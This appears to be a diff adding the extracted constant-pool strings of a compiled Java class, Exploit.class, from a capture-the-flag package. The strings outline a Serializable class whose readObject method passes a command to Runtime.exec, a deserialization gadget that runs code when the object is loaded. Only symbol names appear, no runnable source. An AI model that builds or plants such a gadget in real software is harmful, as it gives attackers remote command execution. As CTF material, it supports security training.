@@ -1,0 +1,34 @@
+serialVersionUID
+ConstantValue
+Ljava/lang/String;
+<init>
+(Ljava/lang/String;)V
+Code
+LineNumberTable
+LocalVariableTable
+this
+Lctf/jargon/Exploit;
+readObject
+(Ljava/io/ObjectInputStream;)V
+Ljava/io/ObjectInputStream;
+Exceptions
+toString
+()Ljava/lang/String;
+SourceFile
+Exploit.java
+java/lang/StringBuilder
+ Exploit triggered with command: 
+ctf/jargon/Exploit
+java/lang/Object
+java/io/Serializable
+java/io/IOException
+ java/lang/ClassNotFoundException
+java/io/ObjectInputStream
+defaultReadObject
+java/lang/Runtime
+getRuntime
+()Ljava/lang/Runtime;
+exec
+'(Ljava/lang/String;)Ljava/lang/Process;
+append
+-(Ljava/lang/String;)Ljava/lang/StringBuilder;
